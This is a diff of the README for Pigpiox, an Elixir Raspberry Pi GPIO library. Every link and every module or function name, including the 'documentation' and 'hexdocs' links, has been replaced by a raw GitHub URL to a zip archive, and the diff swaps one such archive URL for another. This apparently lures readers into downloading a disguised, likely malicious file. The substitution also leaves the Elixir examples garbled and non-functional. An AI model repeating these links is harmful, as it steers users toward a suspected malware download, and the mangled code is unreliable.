@@ -1,6 +1,6 @@
 # Pigpiox
 
-Pigpiox is a wrapper around pigpiod for the Raspberry Pi. For all of pigpio's features, check out its [documentation](https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip).
+Pigpiox is a wrapper around pigpiod for the Raspberry Pi. For all of pigpio's features, check out its [documentation](https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip).
 
 
 # Requirements
@@ -11,7 +11,7 @@ If you'd like to use Pigpiox on one of those systems, customize the nerves syste
 
 # Installation
 
-In your firmware's `https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip`, add `pigpiox` to your deps for your system target:
+In your firmware's `https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip`, add `pigpiox` to your deps for your system target:
 
 ```elixir
 def deps(target) do
@@ -28,16 +28,16 @@ Adding pigpiox as a dependency to your system will automatically launch the pigp
 
 ### Basic functionality
 
-The `https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip` provides basic GPIO functionality. Here's an example of reading and writing a GPIO:
+The `https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip` provides basic GPIO functionality. Here's an example of reading and writing a GPIO:
 
 ```elixir
 gpio = 17
 
-https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip(gpio, :input)
-{:ok, level} = https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip(gpio)
+https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip(gpio, :input)
+{:ok, level} = https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip(gpio)
 
-https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip(gpio, :output)
-https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip(gpio, 1)
+https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip(gpio, :output)
+https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip(gpio, 1)
 ```
 
 ### Watching a GPIO
@@ -45,40 +45,40 @@ https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.
 When reading a GPIO, often it's useful to know immediately when its level changes, instead of having to constantly poll it. Here's an example:
 
 ```elixir
-{:ok, pid} = https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip(gpio)
+{:ok, pid} = https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip(gpio)
 ```
 
 After setting up a watch on a GPIO pin, the calling process will receive messages of the format `{:gpio_leveL_change, gpio, level}` as its level change.
 
 ## Waveforms
 
-The `https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip` module provides functions that allow you to create and send waveforms on the Raspberry Pi. Here's an example of pulsing a GPIO on and off every 500ms:
+The `https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip` module provides functions that allow you to create and send waveforms on the Raspberry Pi. Here's an example of pulsing a GPIO on and off every 500ms:
 
 ```elixir
 pulses = [
-  %https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip{gpio_on: gpio, delay: 500000},
-  %https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip{gpio_off: gpio, delay: 500000}
+  %https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip{gpio_on: gpio, delay: 500000},
+  %https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip{gpio_off: gpio, delay: 500000}
 ]
 
-https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip(pulses)
+https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip(pulses)
 
-{:ok, wave_id} = https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip()
+{:ok, wave_id} = https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip()
 
-https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip(gpio, :output)
+https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip(gpio, :output)
 
-https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip(wave_id)
+https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip(wave_id)
 ```
 
 ## Clock
 
-The `https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip` module provides functions that allow you to set a clock on reserved pin.
+The `https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip` module provides functions that allow you to set a clock on reserved pin.
 
 ```elixir
-https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip(gpio, 2_500_000)
+https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip(gpio, 2_500_000)
 ```
 
-All documentation available on [hexdocs](https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip).
+All documentation available on [hexdocs](https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip).
 
 # Contributions
 
-This library is still in a very early stage, and I'd appreciate any and all contributions. In particular, a short-term goal is getting feature parity with the [python](https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip) pigpiod client library.
+This library is still in a very early stage, and I'd appreciate any and all contributions. In particular, a short-term goal is getting feature parity with the [python](https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip) pigpiod client library.
